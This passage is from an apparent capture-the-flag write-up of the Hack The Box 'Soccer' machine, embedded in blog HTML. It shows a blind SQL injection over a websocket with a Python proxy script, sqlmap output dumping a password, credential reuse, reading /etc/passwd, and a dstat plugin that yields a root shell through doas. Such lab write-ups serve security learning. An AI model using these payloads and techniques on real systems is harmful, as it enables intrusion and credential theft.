+tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp6       0      0 :::80                   :::<span class="k">*</span>                    LISTEN      1106/nginx: worker  
+tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:<span class="k">*</span>                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:<span class="k">*</span>                           -                  
+
+</code></pre></div></div>
+
+<p>We can see <code class="language-plaintext highlighter-rouge">MySQL</code> is running internally as port <code class="language-plaintext highlighter-rouge">3306</code> is open and an unknown service on localhost port <code class="language-plaintext highlighter-rouge">3000</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+bash-5.0<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /etc/nginx/sites-enabled/
+total 8
+drwxr-xr-x 2 root root 4096 Dec  1 13:48 <span class="nb">.</span>
+drwxr-xr-x 8 root root 4096 Nov 17 08:06 ..
+lrwxrwxrwx 1 root root   34 Nov 17 08:06 default -&gt; /etc/nginx/sites-available/default
+lrwxrwxrwx 1 root root   41 Nov 17 08:39 soc-player.htb -&gt; /etc/nginx/sites-available/soc-player.htb
+bash-5.0<span class="nv">$ </span><span class="nb">cat</span> /etc/nginx/sites-enabled/soc-player.htb 
+server <span class="o">{</span>
+	listen 80<span class="p">;</span>
+	listen <span class="o">[</span>::]:80<span class="p">;</span>
+
+	server_name soc-player.soccer.htb<span class="p">;</span>
+
+	root /root/app/views<span class="p">;</span>
+
+	location / <span class="o">{</span>
+		proxy_pass http://localhost:3000<span class="p">;</span>
+		proxy_http_version 1.1<span class="p">;</span>
+		proxy_set_header Upgrade <span class="nv">$http_upgrade</span><span class="p">;</span>
+		proxy_set_header Connection <span class="s1">'upgrade'</span><span class="p">;</span>
+		proxy_set_header Host <span class="nv">$host</span><span class="p">;</span>
+		proxy_cache_bypass <span class="nv">$http_upgrade</span><span class="p">;</span>
+	<span class="o">}</span>
+
+<span class="o">}</span>
+
+</code></pre></div></div>
+
+<p>Looking at the <code class="language-plaintext highlighter-rouge">nginx</code> configuration directory, we can see two <code class="language-plaintext highlighter-rouge">conf</code> files in <code class="language-plaintext highlighter-rouge">site-enabled</code> section.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">soc-player.htb</code> configuration file reveals a subdomain <code class="language-plaintext highlighter-rouge">soc-player.soccer.htb</code> which is basically the web appplication on localhost port <code class="language-plaintext highlighter-rouge">3000</code>.</p>
+
+<p>Let us add that to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+
+<h1 id="back-to-web-enumeration">BACK TO WEB ENUMERATION</h1>
+
+<p>Visiting the <code class="language-plaintext highlighter-rouge">http://soc-player.soccer.htb/</code> website, we can see the below page:</p>
+
+<p><img src="/assets/images/writeups/soccer/6.png" alt="" /></p>
+
+<p>Well, we can see the old template with few features here: <code class="language-plaintext highlighter-rouge">login</code>, <code class="language-plaintext highlighter-rouge">signup</code> and other things.</p>
+
+<p>Now that we have login features, having <code class="language-plaintext highlighter-rouge">MySQL</code> running internally creates a sense.</p>
+
+<p>Let us create a dummy account: <code class="language-plaintext highlighter-rouge">test@curiosity.hacks : test</code>.</p>
+
+<p><img src="/assets/images/writeups/soccer/7.png" alt="" /></p>
+
+<p>We can see a <code class="language-plaintext highlighter-rouge">ticket ID</code> and a text box which seems doing nothing.</p>
+
+<p>Let us check that in burpsuite.</p>
+
+<p><img src="/assets/images/writeups/soccer/8.png" alt="" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">input box</code> is not at all worthless, the value in that box is passed as websocket message to <code class="language-plaintext highlighter-rouge">ws://soc-player.soccer.htb:9091</code>.</p>
+
+<p><img src="/assets/images/writeups/soccer/9.png" alt="" /></p>
+
+<p>For a valid ticket, the server replies with <code class="language-plaintext highlighter-rouge">Ticket Exists</code>.</p>
+
+<p><img src="/assets/images/writeups/soccer/10.png" alt="" /></p>
+
+<p>For an invalid ticket, the server replies with <code class="language-plaintext highlighter-rouge">Ticket Doesn't Exist</code>.</p>
+
+<h1 id="sql-injection-in-websocket">SQL INJECTION IN WEBSOCKET</h1>
+
+<p>Since there is <code class="language-plaintext highlighter-rouge">MySQL</code> is running and there is checking if a ticket is valid, the most obvious vulnerability in this case is a <code class="language-plaintext highlighter-rouge">SQL injection</code>.</p>
+
+<p><img src="/assets/images/writeups/soccer/12.png" alt="" /></p>
+
+<p>We can see that the ticket does not exist for payload <code class="language-plaintext highlighter-rouge">69081 AND 1=2 -- - </code>.</p>
+
+<p><img src="/assets/images/writeups/soccer/11.png" alt="" /></p>
+
+<p>Again, we see that the ticket exists for payload <code class="language-plaintext highlighter-rouge">69081 AND 1=1 -- - </code>.</p>
+
+<p>In the first case, due to the <code class="language-plaintext highlighter-rouge">AND 1=2</code> the whole query returns nothing and we see the error message <code class="language-plaintext highlighter-rouge">Ticket Doesn't Exist</code>.</p>
+
+<p>In the second case, the <code class="language-plaintext highlighter-rouge">AND 1=1</code> returns a valid ticket and we see <code class="language-plaintext highlighter-rouge">Ticket Exists</code>.</p>
+
+<p>This confirms there is a blind SQL injection in the websocket.</p>
+
+<h1 id="exploiting-sql-injection">EXPLOITING SQL INJECTION</h1>
+
+<p>Unfortunately, <code class="language-plaintext highlighter-rouge">sqlmap</code> does not have the support for testing websockets.</p>
+
+<p>But we can definitely create a proxy HTTP service that redirects the message to the websocket.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kn">from</span> <span class="nn">http.server</span> <span class="kn">import</span> <span class="n">SimpleHTTPRequestHandler</span>
+<span class="kn">from</span> <span class="nn">socketserver</span> <span class="kn">import</span> <span class="n">TCPServer</span>
+<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">unquote</span><span class="p">,</span> <span class="n">urlparse</span>
+<span class="kn">from</span> <span class="nn">websocket</span> <span class="kn">import</span> <span class="n">create_connection</span>
+
+<span class="n">ws_server</span> <span class="o">=</span> <span class="s">"ws://soc-player.soccer.htb:9091"</span>
+
+<span class="k">def</span> <span class="nf">send_ws</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+	<span class="n">ws</span> <span class="o">=</span> <span class="n">create_connection</span><span class="p">(</span><span class="n">ws_server</span><span class="p">)</span>
+	<span class="c1"># If the server returns a response on connect, use below line	
+</span>	<span class="c1">#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
+</span>	
+	<span class="c1"># For our case, format the payload in JSON
+</span>	<span class="n">message</span> <span class="o">=</span> <span class="n">unquote</span><span class="p">(</span><span class="n">payload</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'"'</span><span class="p">,</span><span class="s">'</span><span class="se">\'</span><span class="s">'</span><span class="p">)</span> <span class="c1"># replacing " with ' to avoid breaking JSON structure
+</span>	<span class="n">data</span> <span class="o">=</span> <span class="s">'{"id":"%s"}'</span> <span class="o">%</span> <span class="n">message</span>
+
+	<span class="n">ws</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+	<span class="n">resp</span> <span class="o">=</span> <span class="n">ws</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+	<span class="n">ws</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+	<span class="k">if</span> <span class="n">resp</span><span class="p">:</span>
+		<span class="k">return</span> <span class="n">resp</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="k">return</span> <span class="s">''</span>
+
+<span class="k">def</span> <span class="nf">middleware_server</span><span class="p">(</span><span class="n">host_port</span><span class="p">,</span><span class="n">content_type</span><span class="o">=</span><span class="s">"text/plain"</span><span class="p">):</span>
+
+	<span class="k">class</span> <span class="nc">CustomHandler</span><span class="p">(</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
+		<span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
+			<span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+			<span class="k">try</span><span class="p">:</span>
+				<span class="n">payload</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">path</span><span class="p">).</span><span class="n">query</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'='</span><span class="p">,</span><span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+			<span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
+				<span class="n">payload</span> <span class="o">=</span> <span class="bp">False</span>
+				
+			<span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
+				<span class="n">content</span> <span class="o">=</span> <span class="n">send_ws</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+			<span class="k">else</span><span class="p">:</span>
+				<span class="n">content</span> <span class="o">=</span> <span class="s">'No parameters specified!'</span>
+
+			<span class="bp">self</span><span class="p">.</span><span class="n">send_header</span><span class="p">(</span><span class="s">"Content-type"</span><span class="p">,</span> <span class="n">content_type</span><span class="p">)</span>
+			<span class="bp">self</span><span class="p">.</span><span class="n">end_headers</span><span class="p">()</span>
+			<span class="bp">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+			<span class="k">return</span>
+
+	<span class="k">class</span> <span class="nc">_TCPServer</span><span class="p">(</span><span class="n">TCPServer</span><span class="p">):</span>
+		<span class="n">allow_reuse_address</span> <span class="o">=</span> <span class="bp">True</span>
+
+	<span class="n">httpd</span> <span class="o">=</span> <span class="n">_TCPServer</span><span class="p">(</span><span class="n">host_port</span><span class="p">,</span> <span class="n">CustomHandler</span><span class="p">)</span>
+	<span class="n">httpd</span><span class="p">.</span><span class="n">serve_forever</span><span class="p">()</span>
+
+
+<span class="k">print</span><span class="p">(</span><span class="s">"[+] Starting MiddleWare Server"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"[+] Send payloads in http://localhost:8081/?id=*"</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span>
+	<span class="n">middleware_server</span><span class="p">((</span><span class="s">'0.0.0.0'</span><span class="p">,</span><span class="mi">1337</span><span class="p">))</span>
+<span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
+	<span class="k">pass</span>
+
+</code></pre></div></div>
+
+<p>This script has been taken from <a href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">here</a>. Kudos to <code class="language-plaintext highlighter-rouge">rayhan0x01</code> for his amazing explanation.</p>
+
+<p>This script just creates a HTTP server and takes the value of <code class="language-plaintext highlighter-rouge">id</code> parameter in each request and passes it to given websocket as a message.</p>
+
+<p>Now we can use <code class="language-plaintext highlighter-rouge">sqlmap</code> on this proxy, which is basically the same as running <code class="language-plaintext highlighter-rouge">sqlmap</code> on the websocket.</p>
+
+<p>Running the proxy:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+┌──<span class="o">(</span>n3hal㉿Universe7<span class="o">)</span>-[~/…/hackthebox/soccer/web/exploits]
+└─<span class="nv">$ </span>python middleware.py
+<span class="o">[</span>+] Starting MiddleWare Server
+<span class="o">[</span>+] Send payloads <span class="k">in </span>http://localhost:1337/?id<span class="o">=</span><span class="k">*</span>
+
+</code></pre></div></div>
+
+<p>Running <code class="language-plaintext highlighter-rouge">sqlmap</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+┌──<span class="o">(</span>n3hal㉿Universe7<span class="o">)</span>-[~/…/hackthebox/soccer/web/exploits]
+└─<span class="nv">$ </span>sqlmap <span class="nt">-u</span> <span class="s2">"http://localhost:1337/?id=1"</span> <span class="nt">--dbms</span> mysql <span class="nt">--batch</span>  
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  <span class="o">{</span>1.6.8#stable<span class="o">}</span>
+|_ -| <span class="nb">.</span> <span class="o">[</span><span class="s2">"]     | .'| . |
+|___|_  ["</span><span class="o">]</span>_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+<span class="o">[!]</span> legal disclaimer: Usage of sqlmap <span class="k">for </span>attacking targets without prior mutual consent is illegal. It is the end user<span class="s1">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 04:31:16 /2022-12-29/
+
+[04:31:18] [INFO] testing connection to the target URL
+[04:31:19] [WARNING] turning off pre-connect mechanism because of incompatible server ('</span>SimpleHTTP/0.6 Python/3.10.8<span class="s1">')
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 6779 FROM (SELECT(SLEEP(5)))zdVp)
+---
+[04:31:19] [INFO] testing MySQL
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '</span><span class="nt">--time-sec</span><span class="s1">')? [Y/n] Y
+[04:31:54] [INFO] confirming MySQL
+[04:31:54] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+[04:32:06] [INFO] adjusting time delay to 2 seconds due to good response times
+[04:32:06] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &gt;= 8.0.0
+[04:32:06] [INFO] fetched data logged to text files under '</span>/home/n3hal/.local/share/sqlmap/output/localhost<span class="s1">'
+
+[*] ending @ 04:32:06 /2022-12-29/
+
+</span></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">sqlmap</code> detects the <code class="language-plaintext highlighter-rouge">time-based blind injection</code>.</p>
+
+<p>After tinkering with the SQLi, you will know that there is a <code class="language-plaintext highlighter-rouge">soccer_db</code> database with a table called <code class="language-plaintext highlighter-rouge">accounts</code> having a column called <code class="language-plaintext highlighter-rouge">password</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+┌──<span class="o">(</span>n3hal㉿Universe7<span class="o">)</span>-[~/…/hackthebox/soccer/web/exploits]
+└─<span class="nv">$ </span>sqlmap <span class="nt">-u</span> <span class="s2">"http://localhost:1337/?id=1"</span> <span class="nt">-D</span> soccer_db <span class="nt">-T</span> accounts <span class="nt">-C</span> password <span class="nt">--dump</span>
+        ___
+       __H__
+ ___ ___[<span class="s1">']_____ ___ ___  {1.6.8#stable}
+|_ -| . [)]     | .'</span>| <span class="nb">.</span> |
+|___|_  <span class="o">[</span>.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+<span class="o">[!]</span> legal disclaimer: Usage of sqlmap <span class="k">for </span>attacking targets without prior mutual consent is illegal. It is the end user<span class="s1">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 04:34:57 /2022-12-29/
+
+[04:34:57] [INFO] resuming back-end DBMS '</span>mysql<span class="s1">' 
+[04:34:57] [INFO] testing connection to the target URL
+[04:34:59] [WARNING] turning off pre-connect mechanism because of incompatible server ('</span>SimpleHTTP/0.6 Python/3.10.8<span class="s1">')
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 6779 FROM (SELECT(SLEEP(5)))zdVp)
+---
+[04:34:59] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL 8
+[04:34:59] [INFO] fetching entries of column(s) '</span>password<span class="s1">' for table '</span>accounts<span class="s1">' in database '</span>soccer_db<span class="s1">'
+[04:34:59] [INFO] fetching number of column(s) '</span>password<span class="s1">' entries for table '</span>accounts<span class="s1">' in database '</span>soccer_db<span class="s1">'
+[04:34:59] [INFO] resumed: 1
+[04:34:59] [INFO] resumed: PlayerOftheMatch2022
+Database: soccer_db
+Table: accounts
+[1 entry]
++----------------------+
+| password             |
++----------------------+
+| PlayerOftheMatch2022 |
++----------------------+
+
+[04:34:59] [INFO] table '</span>soccer_db.accounts<span class="s1">' dumped to CSV file '</span>/home/n3hal/.local/share/sqlmap/output/localhost/dump/soccer_db/accounts.csv<span class="s1">'
+[04:34:59] [INFO] fetched data logged to text files under '</span>/home/n3hal/.local/share/sqlmap/output/localhost<span class="s1">'
+
+[*] ending @ 04:34:59 /2022-12-29/
+
+</span></code></pre></div></div>
+
+<p>We have dumped a password: <code class="language-plaintext highlighter-rouge">PlayerOftheMatch2022</code>.</p>
+
+<h1 id="shell-as-player">SHELL AS PLAYER</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+bash-5.0<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+fwupd-refresh:x:112:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+player:x:1001:1001::/home/player:/bin/bash
+mysql:x:113:121:MySQL Server,,,:/nonexistent:/bin/false
+_laurel:x:997:997::/var/log/laurel:/bin/false
+
+</code></pre></div></div>
+
+<p>The user in this box is: <code class="language-plaintext highlighter-rouge">player</code>.</p>
+
+<p>We can use the same dumped password to log into <code class="language-plaintext highlighter-rouge">player</code>’s account.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+bash-5.0<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+bash-5.0<span class="nv">$ </span>
+bash-5.0<span class="nv">$ </span>su - player
+Password: 
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span>
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>player<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>player<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>player<span class="o">)</span>
+
+</code></pre></div></div>
+
+<h1 id="privilege-escalation">PRIVILEGE ESCALATION</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span>find / <span class="nt">-type</span> f <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
+/usr/local/bin/doas
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/umount
+/usr/bin/fusermount
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/bash
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/at
+/snap/snapd/17883/usr/lib/snapd/snap-confine
+/snap/core20/1695/usr/bin/chfn
+/snap/core20/1695/usr/bin/chsh
+/snap/core20/1695/usr/bin/gpasswd
+/snap/core20/1695/usr/bin/mount
+/snap/core20/1695/usr/bin/newgrp
+/snap/core20/1695/usr/bin/passwd
+/snap/core20/1695/usr/bin/su
+/snap/core20/1695/usr/bin/sudo
+/snap/core20/1695/usr/bin/umount
+/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1695/usr/lib/openssh/ssh-keysign
+
+</code></pre></div></div>
+
+<p>Looking for <code class="language-plaintext highlighter-rouge">SUID</code> files we can see that the <code class="language-plaintext highlighter-rouge">doas</code> is present in this box.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span>find / <span class="nt">-name</span> doas<span class="k">*</span> 2&gt;/dev/null
+/usr/local/share/man/man5/doas.conf.5
+/usr/local/share/man/man1/doas.1
+/usr/local/share/man/man8/doasedit.8
+/usr/local/bin/doasedit
+/usr/local/bin/doas
+/usr/local/etc/doas.conf
+
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">conf</code> file of <code class="language-plaintext highlighter-rouge">doas</code> is at: <code class="language-plaintext highlighter-rouge">/usr/local/etc/doas.conf</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">cat</span> /usr/local/etc/doas.conf
+permit nopass player as root cmd /usr/bin/dstat
+
+</code></pre></div></div>
+
+<p>We can see that the user <code class="language-plaintext highlighter-rouge">player</code> can run <code class="language-plaintext highlighter-rouge">/usr/bin/dstat</code> as root without password using <code class="language-plaintext highlighter-rouge">doas</code>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">dstat</code> is a versatile tool for generating system resource statistics.</p>
+
+<p>It allows users to create a custom plugin and execute by adding option e.g. <code class="language-plaintext highlighter-rouge">dstat --myplugin</code>.</p>
+
+<p>Learn more about it <a href="https://exploit-notes.hdks.org/exploit/sudo-privilege-escalation/">here</a>.</p>
+
+<p>First, we need to find where we can create our plugin.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span>find / <span class="nt">-type</span> d <span class="nt">-name</span> dstat 2&gt;/dev/null
+/usr/share/doc/dstat
+/usr/share/dstat
+/usr/local/share/dstat
+
+</code></pre></div></div>
+
+<p>The plugins can be created in <code class="language-plaintext highlighter-rouge">/usr/local/share/dstat</code> directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">pwd</span>
+/usr/local/share/dstat
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span>
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">ls
+</span>dstat_curiosity.py
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span>
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">cat </span>dstat_curiosity.py 
+import os
+
+os.system<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span>
+
+</code></pre></div></div>
+
+<p>A file <code class="language-plaintext highlighter-rouge">dstat_curiosity.py</code> is created at <code class="language-plaintext highlighter-rouge">/usr/local/share/dstat</code>. The name of the file must be <code class="language-plaintext highlighter-rouge">dstat_&lt;name&gt;.py</code> to be a valid plugin.</p>
+
+<p>The file just runs <code class="language-plaintext highlighter-rouge">/bin/bash</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span>doas <span class="nt">-u</span> root /usr/bin/dstat <span class="nt">--list</span>
+internal:
+	aio,cpu,cpu-adv,cpu-use,cpu24,disk,disk24,disk24-old,epoch,fs,int,int24,io,ipc,load,lock,mem,mem-adv,net,page,page24,proc,raw,socket,swap,swap-old,sys,tcp,time,
+	udp,unix,vm,vm-adv,zones
+/usr/share/dstat:
+	battery,battery-remain,condor-queue,cpufreq,dbus,disk-avgqu,disk-avgrq,disk-svctm,disk-tps,disk-util,disk-wait,dstat,dstat-cpu,dstat-ctxt,dstat-mem,fan,freespace,fuse,
+	gpfs,gpfs-ops,helloworld,ib,innodb-buffer,innodb-io,innodb-ops,jvm-full,jvm-vm,lustre,md-status,memcache-hits,mongodb-conn,mongodb-mem,mongodb-opcount,mongodb-queue,
+	mongodb-stats,mysql-io,mysql-keys,mysql5-cmds,mysql5-conn,mysql5-innodb,mysql5-innodb-basic,mysql5-innodb-extra,mysql5-io,mysql5-keys,net-packets,nfs3,nfs3-ops,nfsd3,
+	nfsd3-ops,nfsd4-ops,nfsstat4,ntp,postfix,power,proc-count,qmail,redis,rpc,rpcd,sendmail,snmp-cpu,snmp-load,snmp-mem,snmp-net,snmp-net-err,snmp-sys,snooze,squid,test,
+	thermal,top-bio,top-bio-adv,top-childwait,top-cpu,top-cpu-adv,top-cputime,top-cputime-avg,top-int,top-io,top-io-adv,top-latency,top-latency-avg,top-mem,top-oom,utmp,vm-cpu,
+	vm-mem,vm-mem-adv,vmk-hba,vmk-int,vmk-nic,vz-cpu,vz-io,vz-ubc,wifi,zfs-arc,zfs-l2arc,zfs-zil
+/usr/local/share/dstat:
+	curiosity
+
+</code></pre></div></div>
+
+<p>We can see that the plugin has been loaded.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span>doas <span class="nt">-u</span> root /usr/bin/dstat <span class="nt">--curiosity</span>
+/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated <span class="k">in </span>favour of importlib<span class="p">;</span> see the module<span class="s1">'s documentation for alternative uses
+  import imp
+root@soccer:/usr/local/share/dstat# 
+root@soccer:/usr/local/share/dstat# id; whoami
+uid=0(root) gid=0(root) groups=0(root)
+root
+root@soccer:/usr/local/share/dstat# 
+root@soccer:/usr/local/share/dstat# hostname
+soccer
+root@soccer:/usr/local/share/dstat# 
+
+</span></code></pre></div></div>
+
+<p>We can simply run the plugin as <code class="language-plaintext highlighter-rouge">dstat --&lt;plugin name&gt;</code>.</p>
+
+<p>Running the plugin with <code class="language-plaintext highlighter-rouge">doas</code> gives us <code class="language-plaintext highlighter-rouge">root</code> shell.</p>
+
+<h1 id="conclusion">CONCLUSION</h1>
+
+<p>The box is all about exploiting a file upload to RCE vulnerability in <code class="language-plaintext highlighter-rouge">Tiny File Manager</code>, then exploiting a blind SQL injection through web sockets and privilege escalation by exploiting doas rights of a user.</p>
+
+<p>Overall the box is easy yet lengthy.</p>
+
+<p>The intial file upload to RCE issue is quite obvious.</p>
+
+<p>The main takeaway from this box can be about how to exploit server side vulnerabilites like <code class="language-plaintext highlighter-rouge">SQLi</code> in websockets, as this is something which is not commonly seen in CTFs.</p>
+
+<p>The privilege escalation part is just a simple googling stuff.</p>
+
+<p>This is all in this box.</p>
+
+<p>Thanks for reading this far.</p>
+
+<p>Hope you liked it.</p>
+
+
+
+  <small>tags: <em>file upload vulnerability</em> - <em>tiny file manager RCE</em> - <em>websockets</em> - <em>blind sqli</em> - <em>dstat exploit</em></small>
+
+
+      </section>
+    </div>
+  </body>
+</html>
